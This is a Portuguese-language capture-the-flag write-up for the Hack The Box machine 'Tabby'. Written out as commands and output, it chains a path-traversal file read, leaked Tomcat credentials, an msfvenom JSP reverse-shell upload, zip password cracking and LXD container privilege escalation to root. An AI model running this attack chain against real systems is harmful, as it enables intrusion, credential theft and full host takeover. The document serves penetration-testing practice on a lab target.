---
title: "Tabby"
date: 2020-10-19T16:49:28-03:00
draft: false
---


![HTB](/tabby-01.png)

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Initiating NSE at 17:20
Completed NSE at 17:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.88 seconds
           Raw packets sent: 82699 (3.639MB) | Rcvd: 66386 (2.655MB)
```
![HTB](/tabby-02.png)

blz vou tentar acessar a porta  8080

![HTB](/tabby-03.png)

http://megahosting.htb:8080/

Coloquei meu ip no meu hosts > para o nome do site

ele mostra o local no path  /var/lib/

tomcat9/webapps/ROOT/index.html

/var/lib/tomcat9

/usr/share/doc/tomcat9-common/RUNNING.txt.gz

/etc/tomcat9/tomcat-users.xml.

Esse site tem  LFI

https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/


Por isso entendi o por que dos paths dentro da porta 8080

exemplo:

megahosting.htb/news.php?file=../../../../etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash 
```

agora consigo ver dentro desses paths que ele deu a dica lá atrás

/var/lib/tomcat9/webapps/ROOT/index.html

/var/lib/tomcat9

/usr/share/doc/tomcat9-common/RUNNING.txt.gz

/etc/tomcat9/tomcat-users.xml.

```bash
http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

Inspecione a págna para ver os atributos de acordo com a documentação do LFI


```bash
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

agora podemos fazer o shell reverso
igual nas outras maquinas

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 <IP> LPORT=4444 -f war > exploit.war
```

Depois fazemos upload do arquivo war

```bash
curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war"
```

em outra aba do terminal, deixe escutando na porta que desejar

```bash
nc -nvlp 4444
```
com o netcat

Quando estiver ouvindo a porta,  vá no navegador e chame o arquivo que vc acabou de fazer o upload

```bash
http://10.10.10.194:8080/exploit.war/
```
volte no terminal, ele vai ter conectado via shell
agora execute o shell reverso em python para o term

```bash
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
tomcat@tabby:/var/lib/tomcat9$ 
```

Agora entre em  /var/www/files

vc vai encontrar o arquivo  16162020_backup.zip

acesse no navegador

10.10.10.194/files/16162020_backup.zip

e baixe o arquivo zip para sua maquina

ele ta protegido com senha

vai ser necessário usar o  `fcrackzip` nele se não tiver ele instalado, basta, instalar:

# apt-get install fcrackzip

```bash
 root  ~  fcrackzip -h

fcrackzip version 1.0, a fast/free zip password cracker
written by Marc Lehmann <pcg@goof.com> You can find more info on
http://www.goof.com/pcg/marc/

USAGE: fcrackzip
          [-b|--brute-force]            use brute force algorithm
          [-D|--dictionary]             use a dictionary
          [-B|--benchmark]              execute a small benchmark
          [-c|--charset characterset]   use characters from charset
          [-h|--help]                   show this message
          [--version]                   show the version of this program
          [-V|--validate]               sanity-check the algorithm
          [-v|--verbose]                be more verbose
          [-p|--init-password string]   use string as initial password/file
          [-l|--length min-max]         check password with length min to max
          [-u|--use-unzip]              use unzip to weed out wrong passwords
          [-m|--method num]             use method number "num" (see below)
          [-2|--modulo r/m]             only calculcate 1/m of the password
          file...                    the zipfiles to crack

methods compiled in (* = default):

 0: cpmask
 1: zip1
*2: zip2, USE_MULT_TAB
```

Usei esses parametros e a lista  rockyou para fazer o brute forte

```bash
fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
```

Foi rápido até

possible pw found: admin@it ()

com essa senha da para descompactar o arquivo na verdade essa senha nao vai ser para  descompactar o arquivo, essa senha é do user da maquina

Depois volte para o terminal logado na maquina
e va para o

cd /home

Faça login com esse tal de ash

```bash
tomcat@tabby:/home$ ls
ls
ash
tomcat@tabby:/home$ cd ash    
cd ash
bash: cd: ash: Permission denied
tomcat@tabby:/home$ su ash
su ash
Password: admin@it

ash@tabby:/home$ ls
ls
ash
ash@tabby:/home$ 
```

```bash
ash@tabby:/home$ cd ash
cd ash
ash@tabby:~$ ls
ls
linpeas.sh  snap  user.txt
ash@tabby:~$ 
```

a flag de user


```bash
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

```bash
ash@tabby:~$ sudo -l
    sudo: unable to open /run/sudo/ts/ash: Read-only file system
    [sudo] password for ash: 
     Sorry, user ash may not run sudo on tabby.
```

Para o root está sendo mais dificil

encontrei este cara 

https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation

https://github.com/lxc/distrobuilder

ele monta um container, dentro da pasta que vc quiser e estipular no seu S.O e escala o privilégio montando um container dentro da maquina alvo, vou testar

basta seguir os passos certinho dessa doc ai que monta o container. Abre uma outra aba no terminal e deixa escutando o httpServer para transferir os arquivos

```bash
  ┌─[root@liquid]─[~/Desktop/HTB/tabby/lxd-alpine-builder]
    └──╼ #ls -l
    total 3180
    -rw-r--r-- 1 root root 3212312 Jun 21 22:04 alpine-v3.12-x86_64-20200621_2204.tar.gz
    -rwxr-xr-x 1 root root    7498 Jun 21 22:03 build-alpine
    -rw-r--r-- 1 root root   26530 Jun 21 22:03 LICENSE
    -rw-r--r-- 1 root root     768 Jun 21 22:03 README.md
    ┌─[✗]─[root@liquid]─[~/Desktop/HTB/tabby/lxd-alpine-builder]
    └──╼ #python -m SimpleHTTPServer 
    Serving HTTP on 0.0.0.0 port 8000 ...

< /pre>
```

```bash
ash@tabby:~$ wget http://10.10.14.29:8000/rootfs.squashfs
ash@tabby:~$ wget http://10.10.14.29:8000/lxd.tar.gz

O meu lxd.tar.gz ele veio com lxd.tar.xz

Eu dei um 'mv' e renomeei ele para 'gz', fiz com xz e deu erro.
```

Passei os arquivos da maquina para dentro da maquiina tabby, ele me gerou esses dois arquivos no caso 
```bash
lxd.tar.xz e rootfs.squashfs
```

Depois

na maquina tabby

fiz o import desse container

A maquina já contém o lxc instalado

```bash
ash@tabby:~$ lxc image import ./lxd.tar.gz rootfs.squashfs --alias alpine
```

rootfs.squashfs = esse arquivo que vai proporcionar o root na maquina é maneiro essa montagem de container.

Com o comando `lxc image list`  vc consegue ver todos os containers montados, no caso só o seu

```bash
ash@tabby:~$ lxc image list
lxc image list
+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION  | ARCHITECTURE |   TYPE    |  SIZE   |          UPLOAD DATE          |
+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
| alpine | a5f784005c68 | no     | Ubuntu focal | x86_64       | CONTAINER | 97.74MB | Jul 10, 2020 at 10:50pm (UTC) |
+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
```

fui seguindo o tutorial do  LXC  no link lá em cima.

```bash
lxd init
```
Esse comando vai começar a montar o container, ele vai fazer uma serie de perguntas, vai deixando tudo como 'default'

```bash
    ash@tabby:~$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: no
    Do you want to configure a new storage pool? (yes/no) [default=yes]: no
    Would you like to connect to a MAAS server? (yes/no) [default=no]: ^C
    ash@tabby:~$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: no
    Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
    Name of the new storage pool [default=default]: 
    Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
    Would you like to connect to a MAAS server? (yes/no) [default=no]: no
    Would you like to create a new local network bridge? (yes/no) [default=yes]: 
    What should the new bridge be called? [default=lxdbr0]: 
    The requested network bridge "lxdbr0" already exists. Please choose another name.
    What should the new bridge be called? [default=lxdbr0]: 
    The requested network bridge "lxdbr0" already exists. Please choose another name.
    What should the new bridge be called? [default=lxdbr0]: liquid
    What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    Would you like LXD to be available over the network? (yes/no) [default=no]: 
    Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
    Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
```

Depois que montei, usei o comando abaixo para iniciar ele. 


```bash
ash@tabby:~$ lxc init alpine privesc -c security.privileged=true
lxc init alpine privesc -c security.privileged=true
Creating privesc
ash@tabby:~$ lxc list
lxc list
+---------+---------+------+------+-----------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+---------+---------+------+------+-----------+-----------+
| privesc | STOPPED |      |      | CONTAINER | 0         |
+---------+---------+------+------+-----------+-----------+
```

Ele foi criaado, porém está stopado.  Fala na documentação que precisa configurar ele no mnt
ai eu fiz isso dessa forma:

```bash
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```
(consta na documentação também)
ele sempre cria o container com o nome 'privesc'

```bash
    ash@tabby:~$ lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
    Device mydevice added to privesc
```

Ele foi montado com sucesso, agora só dar o start no container.


```bash
ash@tabby:~$ lxc start privesc
lxc start privesc
ash@tabby:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /mnt/root
cd /mnt/root
# ls
ls
bin    dev   lib    libx32    mnt   root  snap      sys  var
boot   etc   lib32  lost+found    opt   run   srv       tmp
cdrom  home  lib64  media    proc  sbin  swap.img  usr
# cd root
cd root
# ls
ls
root.txt  snap
# cat root.txt    
cat root.txt
653d95c2eb0f63629eeb048ea1d0a3b5
# 
```





